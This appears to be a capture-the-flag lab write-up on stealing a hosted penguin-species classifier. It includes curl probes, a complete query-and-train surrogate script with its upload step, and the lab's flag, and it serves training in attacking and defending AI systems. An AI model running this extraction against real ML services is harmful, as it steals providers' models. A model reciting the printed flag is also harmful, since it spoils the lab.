---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# Model Reverse Engineering — Penguin Classifier Extraction Lab

Reverse engineer a hosted ML classifier by querying it with crafted inputs, training a surrogate model on the labeled results, and submitting the surrogate to meet the accuracy threshold.

## Target

| Field | Value |
|-------|-------|
| Target | Penguin species classifier API |
| Input features | `flipper_length` (mm), `body_mass` (g) |
| Output | Species prediction (Adelie / Gentoo / Chinstrap) |
| Task | Submit a surrogate model via `/model` with ≥80% accuracy |
| Difficulty | Medium |

## Objective

> Reverse engineer the hosted model and submit a model with at least 80% accuracy to obtain the flag.

---

## Background: Why This Works

The target model is a black-box classifier — we cannot read its weights. But we can observe its input→output behavior. By sending many crafted inputs and collecting the predicted labels, we reconstruct a labeled dataset that approximates the model's learned decision boundary. We then train a new model on that synthetic dataset and submit it. This is **model extraction / model stealing**.

The reason ~100 samples is sufficient is that the Palmer Penguins dataset (which this classifier is based on) has well-separated clusters in flipper_length × body_mass space. A simple linear model achieves ~98% accuracy on this task, so the surrogate does not need to be complex.

---

## Step 1: Probe the API to Discover Input Parameters

Before writing the extraction script, manually probe the API to understand its interface. This is the reconnaissance step the raw lab skips over.

```bash
# Try the base URL to see if there's documentation or an error
curl http://STMIP:STMPO/

# Try an arbitrary GET request to see what parameters the API expects
curl "http://STMIP:STMPO/?flipper_length=200&body_mass=4000"
```

If the API returns a JSON response with a `"result"` key containing a species name, you have confirmed:
- The endpoint accepts GET requests
- Parameters are `flipper_length` and `body_mass`
- The response format is `{"result": "Adelie"}` (or similar)

Try a few manual samples across the plausible range to understand the classification boundaries:

```bash
# Small flipper, small body → likely Adelie
curl "http://STMIP:STMPO/?flipper_length=180&body_mass=3200"
# Large flipper, large body → likely Gentoo
curl "http://STMIP:STMPO/?flipper_length=230&body_mass=5500"
```

This also confirms the valid input range and reveals that three species are returned, giving you ground truth for cross-validating the surrogate.

---

## Step 2: Install Dependencies

```bash
pip install nltk pandas scikit-learn
```

---

## Step 3: Write the Extraction + Surrogate Training Script

The script does three things: generates N random samples across the input space, queries the target API to collect labels, trains a surrogate pipeline, and submits it.

```python
import random
import pandas as pd
import requests
import json
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
import joblib

N_SAMPLES = 100

MIN_FLIPPER_LENGTH = 150
MAX_FLIPPER_LENGTH = 250

MIN_BODY_MASS = 2500
MAX_BODY_MASS = 6500

CLASSIFIER_URL = "http://STMIP:STMPO/"

# Step 1: Generate random samples across the full input space
samples = {
    "Flipper Length (mm)": [random.uniform(MIN_FLIPPER_LENGTH, MAX_FLIPPER_LENGTH) for _ in range(N_SAMPLES)],
    "Body Mass (g)":       [random.uniform(MIN_BODY_MASS, MAX_BODY_MASS)          for _ in range(N_SAMPLES)],
}
samples_df = pd.DataFrame(samples)

# Step 2: Query the target model for each sample — build labeled dataset
predictions = {"species": []}
for i in range(N_SAMPLES):
    resp = requests.get(CLASSIFIER_URL, params={
        "flipper_length": samples["Flipper Length (mm)"][i],
        "body_mass":      samples["Body Mass (g)"][i],
    })
    label = json.loads(resp.text).get("result")
    predictions["species"].append(label)

predictions_df = pd.DataFrame(predictions)

# Step 3: Train surrogate model on the stolen labeled data
# StandardScaler normalizes features so LogisticRegression converges cleanly
# on datasets where features are on different scales (mm vs grams here)
stolen_model = make_pipeline(StandardScaler(), LogisticRegression())
stolen_model.fit(samples_df, predictions_df.values.ravel())

# Step 4: Serialize and submit
joblib.dump(stolen_model, 'student.joblib')
with open('student.joblib', 'rb') as f:
    r = requests.post(CLASSIFIER_URL + '/model', files={'file': ('student.joblib', f)})

print(json.loads(r.text))
```

---

## Step 4: Run the Script

```bash
python3 student.py
```

Expected output:

```
   Flipper Length (mm)  Body Mass (g)
0           201.135527    6300.743874
1           179.858388    4390.647275
...

  species
0  Gentoo
1  Adelie
...

===========

{'accuracy': 0.9854014598540146, 'flag': 'HTB{ff08c0bb37e16f30a0804053a4de70ed}'}
```

The surrogate achieves ~98.5% accuracy, well above the 80% threshold.

**Flag:** `HTB{ff08c0bb37e16f30a0804053a4de70ed}`

---

## Why 100 Samples is Enough

The Palmer Penguins dataset forms three well-separated clusters in flipper_length × body_mass feature space:
- **Adelie:** smaller flipper (~180 mm), smaller body (~3500 g)
- **Gentoo:** larger flipper (~220 mm), larger body (~5200 g)
- **Chinstrap:** medium flipper (~195 mm), medium body (~3700 g)

A linear decision boundary (LogisticRegression) can separate these clusters with high accuracy. The `StandardScaler` is essential because the two features are on very different numeric scales (150–250 vs 2500–6500) — without it, gradient descent in LogisticRegression would be dominated by body_mass.

If the target model were non-linear (e.g., deep neural network with complex decision boundaries), you would need more samples and a more powerful surrogate (e.g., `RandomForestClassifier` or a neural net).

---

## Lessons Learned

- **Model extraction requires only black-box access.** You do not need model weights, architecture details, or training data — only the ability to send inputs and observe outputs.
- **Sample the full input space uniformly.** Clustering samples in a small region will under-sample the decision boundary and reduce surrogate accuracy.
- **Feature scaling matters.** When input features have different units and magnitudes, `StandardScaler` is nearly always required for linear models to converge correctly.
- **Accuracy threshold ≥80% is easy to beat** for well-structured datasets. Real-world model extraction defenses include output rounding, prediction throttling, and API watermarking to detect extraction attacks.

---

## Related Pages

- [[attack/ai/model_reverse_engineering]] — model extraction theory: query-based stealing, membership inference, surrogate training
- [[attack/ai/attacking_ai_systems]] — hub page
- [[definitions/owasp_llm_top10]] — LLM10 (Model Theft)

## Sources

- raw/lab/attacking_ai_applications_and_systems/model_reverse_engineering_lab.md
